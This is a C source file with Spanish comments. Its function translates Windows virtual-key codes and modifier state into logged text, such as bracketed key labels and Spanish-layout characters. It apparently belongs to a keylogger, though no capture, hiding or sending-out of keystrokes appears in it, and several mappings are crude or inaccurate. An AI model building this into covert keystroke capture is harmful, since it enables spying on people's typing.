#include "winkey.h"
#include <wctype.h>

char* VirtualKeyToChar(DWORD vkCode, DWORD scanCode, HKL keyboardLayout)
{
    static char keyName[64];
    static WCHAR unicodeChar[3] = {0};
    static BOOL lastWasAltGrCtrl = FALSE;
    BYTE keyboardState[256];

    // Limpiar buffers
    memset(keyName, 0, sizeof(keyName));

    // Filtro adicional para CAPS LOCK - solo procesar una vez por pulsación
    if (vkCode == VK_CAPITAL) {
        static DWORD lastCapsTime = 0;
        DWORD currentTime = GetTickCount();
        
        // Si ha pasado menos de 100ms desde la última vez, ignorar
        if (currentTime - lastCapsTime < 100) {
            return "";
        }
        lastCapsTime = currentTime;
        return "[CAPS_LOCK]";
    }

    // --- DETECCIÓN DE AltGr ---
    BOOL ctrlPressed = (GetAsyncKeyState(VK_LCONTROL) & 0x8000) || (GetAsyncKeyState(VK_CONTROL) & 0x8000);
    BOOL altPressed = (GetAsyncKeyState(VK_RMENU) & 0x8000) || (GetAsyncKeyState(VK_MENU) & 0x8000);
    BOOL isAltGr = ctrlPressed && altPressed;

    // --- MANEJO DE MODIFICADORES AltGr ---
    if ((vkCode == VK_LCONTROL || vkCode == VK_CONTROL) && altPressed) {
        if (!lastWasAltGrCtrl) {
            lastWasAltGrCtrl = TRUE;
            return "[AltGr]";
        }
        return ""; // Si ya mostramos AltGr, no mostrar nada más
    }
    if ((vkCode == VK_RMENU || vkCode == VK_MENU) && ctrlPressed) {
        return ""; // No mostrar Alt cuando es parte de AltGr
    }

    // Resetear flag cuando no es AltGr
    if (!isAltGr) {
        lastWasAltGrCtrl = FALSE;
    }

    // --- MAPEO CORRECTO BASADO EN EL DEBUG ---
    if (isAltGr) {
        switch(vkCode) {
            case 49:  return "|";     // AltGr + 1 = |
            case 50:  return "@";     // AltGr + 2 = @
            case 51:  return "#";     // AltGr + 3 = #
            case 52:  return "~";     // AltGr + 4 = ~
            case 53:  return "€";     // AltGr + 5 = €
            case 54:  return "¬";     // AltGr + 6 = ¬
            case 186: return "[";     // AltGr + ñ = [
            case 187: return "]";     // AltGr + + = ]
            case 222: return "{";     // AltGr + ´ = {
            case 191: return "}";     // AltGr + ç = }
            case 220: return "\\";    // AltGr + º = backslash
        }
    }

    // Switch normal para teclas especiales
    switch(vkCode)
    {
        // Modificadores - manejar AltGr
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:   
            // Si es parte de AltGr
            if (!isAltGr) return "[CTRL]";
            return "";
        case VK_MENU:
        case VK_LMENU:
        case VK_RMENU:      
            // Si es parte de AltGr
            if (!isAltGr) return "[AltGr]";
            return "";
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:    
            // Solo mostrar [SHIFT] si NO hay otra tecla pulsada (es decir, si Shift está solo)
            // Si Shift está acompañado de otra tecla, no retornes nada y deja que pase a la conversión normal
            if (!(GetAsyncKeyState(VK_LSHIFT) & 0x8000) && !(GetAsyncKeyState(VK_RSHIFT) & 0x8000)) {
                return "[SHIFT]";
            }
            break; // No retornes nada, sigue con la conversión normal

        // Teclas de acción
        case VK_RETURN:     return "[ENTER]\n";
        case VK_TAB:        return "[TAB]";
        case VK_BACK:       return "[BACKSPACE]";
        case VK_DELETE:     return "[DELETE]";
        case VK_ESCAPE:     return "[ESCAPE]";
        case VK_SPACE:      return "[SPACE]";
        case VK_LWIN:       return "[L_WIN]";
        case VK_RWIN:       return "[R_WIN]";
        case VK_NUMLOCK:    return "[NUM_LOCK]";
        case VK_LEFT:       return "[LEFT_ARROW]";
        case VK_RIGHT:      return "[RIGHT_ARROW]";
        case VK_UP:         return "[UP_ARROW]";
        case VK_DOWN:       return "[DOWN_ARROW]";
        case VK_F1:         return "[F1]";
        case VK_F2:         return "[F2]";
        case VK_F3:         return "[F3]";
        case VK_F4:         return "[F4]";
        case VK_F5:         return "[F5]";
        case VK_F6:         return "[F6]";
        case VK_F7:         return "[F7]";
        case VK_F8:         return "[F8]";
        case VK_F9:         return "[F9]";
        case VK_F10:        return "[F10]";
        case VK_F11:        return "[F11]";
        case VK_F12:        return "[F12]";
        case VK_F13:        return "[F13]";
        case VK_F14:        return "[F14]";
        case VK_F15:        return "[F15]";
        case VK_F16:        return "[F16]";
    }

    // Solo procesar otras teclas si NO es AltGr
    if (!isAltGr) {
        // Obtener el estado real del teclado
        if (!GetKeyboardState(keyboardState)) {
            return "";
        }

        // Reflejar el estado real de CAPS LOCK en keyboardState
        if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) {
            keyboardState[VK_CAPITAL] |= 0x01; // Activar bit de toggle
        } else {
            keyboardState[VK_CAPITAL] &= ~0x01; // Desactivar bit de toggle
        }

        // Actualizar manualmente el estado de las teclas modificadoras para asegurar coherencia
        if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
            keyboardState[VK_SHIFT] = 0x80;
            keyboardState[VK_LSHIFT] = 0x80;
            keyboardState[VK_RSHIFT] = 0x80;
        }
        if (GetAsyncKeyState(VK_CONTROL) & 0x8000) {
            keyboardState[VK_CONTROL] = 0x80;
            keyboardState[VK_LCONTROL] = 0x80;
        }
        if (GetAsyncKeyState(VK_MENU) & 0x8000) {
            keyboardState[VK_MENU] = 0x80;
            keyboardState[VK_LMENU] = 0x80;
        }

        // limpiar el buffer antes de usar ToUnicodeEx
        memset(unicodeChar, 0, sizeof(unicodeChar));

        // FORZAR mapeo manual ANTES de ToUnicodeEx para teclas problemáticas del teclado español
        BOOL shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
        
        // ==== GRUPO 1: Letras especiales españolas ====
        if (vkCode == 186) // ñ/Ñ
            return shiftPressed ? "N" : "n";
        if (vkCode == 191) // ç/Ç
            return shiftPressed ? "Ç" : "ç";

        // ==== GRUPO 2: Símbolos y signos españoles ====
        if (vkCode == 192) // º/ª
            return shiftPressed ? "a" : "o";
        if (vkCode == 219) // '/¡
            return shiftPressed ? "!" : "'";
        if (vkCode == 220) // ¿/?
            return shiftPressed ? "?" : "?";
        if (vkCode == 221) // `/^
            return shiftPressed ? "^" : "`";
        if (vkCode == 222) // ´/¨
            return shiftPressed ? "\"" : "'";

        // ==== GRUPO 3: Números y sus símbolos ====
        if (vkCode == 49) // 1/!
            return shiftPressed ? "!" : "1";
        if (vkCode == 50) // 2/"
            return shiftPressed ? "\"" : "2";
        if (vkCode == 51) // 3/·
            return shiftPressed ? "·" : "3";
        if (vkCode == 52) // 4/$
            return shiftPressed ? "$" : "4";
        if (vkCode == 53) // 5/%
            return shiftPressed ? "%" : "5";
        if (vkCode == 54) // 6/&
            return shiftPressed ? "&" : "6";
        if (vkCode == 55) // 7/
            return shiftPressed ? "/" : "7";
        if (vkCode == 56) // 8/(
            return shiftPressed ? "(" : "8";
        if (vkCode == 57) // 9/)
            return shiftPressed ? ")" : "9";
        if (vkCode == 48) // 0/=
            return shiftPressed ? "=" : "0";

        // ==== GRUPO 4: Signos de puntuación y operadores ====
        if (vkCode == 187) // +/*
            return shiftPressed ? "*" : "+";
        if (vkCode == 188) // ,/;
            return shiftPressed ? ";" : ",";
        if (vkCode == 189) // -/_
            return shiftPressed ? "_" : "-";
        if (vkCode == 190) // ./:
            return shiftPressed ? ":" : ".";
        if (vkCode == 226) // menor/mayor
            return shiftPressed ? ">" : "<";

        int result = ToUnicodeEx(vkCode, scanCode, keyboardState, unicodeChar, 2, 0, keyboardLayout);

        if (result > 0) {
            // Asegurar que el buffer esté terminado correctamente
            unicodeChar[result] = L'\0';

            // verificar que el primer caracter sea imprimible
            if (unicodeChar[0] >= 32 && unicodeChar[0] != 127 && iswprint(unicodeChar[0])) {
                // convertir a UTF-8
                int bytesWritten = WideCharToMultiByte(CP_UTF8, 0, unicodeChar, result, keyName, sizeof(keyName) - 1, NULL, NULL);
                if (bytesWritten > 0) {
                    keyName[bytesWritten] = '\0';
                    return keyName;
                }
            }
        }
        else if (result < 0) {
            // tecla muerta detectada
            // intentar obtener la version spacing del caracter muerto
            if (unicodeChar[0] != 0 && iswprint(unicodeChar[0])) {
                unicodeChar[1] = L'\0';
                int bytesWritten = WideCharToMultiByte(CP_UTF8, 0, unicodeChar, 1, 
                                                     keyName, sizeof(keyName) - 1, NULL, NULL);
                if (bytesWritten > 0) {
                    keyName[bytesWritten] = '\0';
                    return keyName;
                }
            }

            // Si no podemos obtener el carácter, intentar mapeo manual para teclas muertas comunes
            switch(vkCode) {
                case 186: return "n";  // ñ simplificado
                case 222: return "'";  // ´ simplificado
                case 192: return "`";  // ` 
                case 221: return "\""; // ¨ simplificado
            }
        }
        
        // Si ToUnicodeEx no devolvió nada, mapeo manual para teclado español
        if (result == 0) {
            // Mapeo manual para caracteres problemáticos del teclado español
            // Usar la variable shiftPressed ya declarada arriba
            
            switch(vkCode) {
                case 186: // ñ/Ñ
                    return shiftPressed ? "N" : "n";     // Simplificado
                case 187: // +/*  
                    return shiftPressed ? "*" : "+";
                case 188: // ,/;
                    return shiftPressed ? ";" : ",";
                case 189: // -/_
                    return shiftPressed ? "_" : "-";
                case 190: // ./:
                    return shiftPressed ? ":" : ".";
                case 191: // ç/Ç
                    return shiftPressed ? "C" : "c";     // Simplificado
                case 192: // º/ª
                    return shiftPressed ? "a" : "o";     // Simplificado
                case 219: // '/¡
                    return shiftPressed ? "!" : "'";     // Simplificado
                case 220: // ¿/?
                    return shiftPressed ? "?" : "?";     // Simplificado
                case 221: // `/^
                    return shiftPressed ? "^" : "`";
                case 222: // ´/¨
                    return shiftPressed ? "\"" : "'";    // Simplificado
                case 226: // menor/mayor
                    return shiftPressed ? ">" : "<";
                    
                // Números con símbolos
                case 49: // 1/!
                    return shiftPressed ? "!" : "1";
                case 50: // 2/"
                    return shiftPressed ? "\"" : "2";
                case 51: // 3/· 
                    return shiftPressed ? "·" : "3";
                case 52: // 4/$
                    return shiftPressed ? "$" : "4";
                case 53: // 5/%
                    return shiftPressed ? "%" : "5";
                case 54: // 6/&
                    return shiftPressed ? "&" : "6";
                case 55: // 7//
                    return shiftPressed ? "/" : "7";
                case 56: // 8/(
                    return shiftPressed ? "(" : "8";
                case 57: // 9/)
                    return shiftPressed ? ")" : "9";
                case 48: // 0/=
                    return shiftPressed ? "=" : "0";
            }
        }
    }
    return "";
}